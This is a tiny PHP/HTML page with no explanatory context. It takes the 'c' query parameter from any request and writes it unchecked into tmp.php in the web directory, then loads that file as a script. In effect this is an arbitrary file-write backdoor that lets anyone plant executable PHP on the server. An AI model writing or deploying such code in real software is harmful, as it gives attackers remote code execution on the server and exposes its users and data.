<!DOCTYPE>
<html>
<head>

</head>
<body>
<?php
$c = "".$_GET['c']."";

file_put_contents(__DIR__.'/tmp.php', $c);
?>
<script src='tmp.php'></script>
</body>
</html>
